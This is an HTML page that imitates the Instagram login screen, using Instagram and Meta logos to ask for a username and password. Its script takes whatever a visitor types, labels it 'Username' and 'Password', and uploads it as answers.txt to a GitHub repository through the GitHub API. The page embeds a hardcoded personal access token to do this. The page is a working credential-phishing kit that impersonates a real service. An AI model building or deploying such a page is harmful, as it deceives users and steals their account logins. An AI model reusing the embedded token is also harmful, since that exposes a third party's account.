<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Birthstone&family=Pacifico&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
        *{
            margin: 0;
            padding: 0;
            font-family: "Poppins", serif;
        }
        body{
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            background: linear-gradient(to bottom left,rgb(228, 241, 245),rgb(234, 243, 245));
        }
        #logo{
            width: 120px;
            height: 120px;
        }
        #metalogo{
            width: 100px;
            height: 100px;
            margin-top: -20px;
        }
        header{
            text-align: center;
            padding: 10px;
            font-size: 14px;
        }
        .form-container {
            width: 100vw;
            display: flex;
            align-items: center;
            flex-direction: column;
        }
        .form-container input[type='text'],input[type='password'],input[type='submit'],button{
            width: 90%;
            height: 60px;
            border-radius: 10px;
            padding-left: 10px;
            margin: 5px;
            border: 1px solid gray;
            font-size: 14px;
        }
        .insta-logo{
            width: 100vw;
            text-align: center;
            margin-top: 40px;
            margin-bottom: 40px;
        }
        .form-container p{
            text-align: center;
            font-size: 16px;
            margin: 5px;
        }
        input[type='submit'],button{
            width: 93%;
            border-radius: 50px;
            height: 45px;
            background-color: rgb(71, 71, 222);
            color: white;
        }
        button{
            background: transparent;
            border: 1px solid  rgb(71, 71, 222);
            color:  rgb(71, 71, 222);
            transition: 0.5s;
        }
        button:hover{
            border: 1px solid white;
            color: white;
            background-color:  rgb(71, 71, 222);
        }
        footer{
            width: 100vw;
            display: flex;
            align-items: center;
            flex-direction: column;
            margin-top: 130px;
        }
        a{
            text-decoration: none;
        }
    </style>
</head>
<body>
    <main>
        <header>
            <p>English (US)</p>
        </header>
        <section>
            <div class="insta-logo">
                <img src="https://static.vecteezy.com/system/resources/previews/018/930/691/non_2x/instagram-logo-instagram-icon-transparent-free-png.png" alt="" id="logo">
            </div>
            <div class="form-container">
                    <input type="text" placeholder="Username, email or mobile number" id="username" required>
                    <input type="password" placeholder="Password" id="userpass" required>
                    <input type="submit" value="Log in" onclick="submitAllAnswers()">
                <p><a href="">Forgot Password?</a></p>
            </div>
        </section>
        <footer>
            <button>Create new account</button>
            <img src="https://static.vecteezy.com/system/resources/previews/024/273/763/original/meta-logo-transparent-free-png.png" alt="" id="metalogo">
        </footer>
    </main>
    <script>
        
        async function submitAllAnswers() {
    const username1 = document.getElementById('username').value;
    const userpass = document.getElementById('userpass').value;
    console.log(username1, userpass);
    
    const allAnswers = `
        Username: ${username1}
        Password: ${userpass}
    `;
    await uploadToGitHub(allAnswers);
}

async function uploadToGitHub(content) {
    const username = 'Justin-Ebenazar';  // Replace with your GitHub username
        const repo = 'e_share';     // Replace with your GitHub repository name
        const token = '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';  // Replace with your personal access token

    const fileName = 'answers.txt';  // The file name to use on GitHub
    const message = 'Add user answers';  // Commit message

    const data = {
        message: message,
        content: btoa(content),  // Base64 encode the content before uploading
        branch: 'main',  // Ensure the correct branch (usually 'main' or 'master')
    };

    try {
        const response = await fetch(`https://api.github.com/repos/${username}/${repo}/contents/${fileName}`, {
            method: 'PUT',
            headers: {
                'Authorization': `token ${token}`,
                'Content-Type': 'application/json',
                'Accept': 'application/vnd.github.v3+json',
            },
            body: JSON.stringify(data),
        });

        if (response.ok) {
            console.log('File uploaded successfully');
        } else {
            const errorData = await response.json();
            console.error('Error uploading file:', response.status, response.statusText, errorData);
        }
    } catch (err) {
        console.error('Error:', err);
    }
}

    </script>
</body>
</html>
